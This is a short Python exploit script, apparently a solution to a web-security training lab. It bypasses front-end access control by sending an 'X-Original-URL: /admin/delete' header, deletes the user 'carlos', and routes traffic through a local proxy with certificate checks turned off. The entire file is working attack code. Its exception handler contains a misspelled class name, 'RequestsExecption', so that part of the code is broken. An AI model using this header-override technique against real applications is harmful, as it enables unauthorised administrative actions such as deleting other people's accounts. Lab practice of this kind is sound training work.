import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(session, base_url):
    
    try:
        path_delete_user = f'{base_url}/?username=carlos'
        headers = {'X-Original-URL': '/admin/delete'}
        response = session.get(path_delete_user, headers=headers, verify=False, proxies=proxies_setting)
        if "you solved" in response.text:
            print(f"[+] user carlos eliminado")
            return True
        else:
            print("[-] No se elimino el usuario")
            return False
        
    except requests.RequestsExecption as e:
        print(f"[-] Error durante el login: {e}")
        return False
    
def main():
    if len(sys.argv) != 2:
        print(f"[+] Uso: {sys.argv[0]} <url>")
        print(f"Ejemplo: {sys.argv[0]} www.example.com")
        exit(-1)
    
    session = requests.session()
    base_url = sys.argv[1]
    delete_user(session, base_url)
        
if __name__ == "__main__":
    main()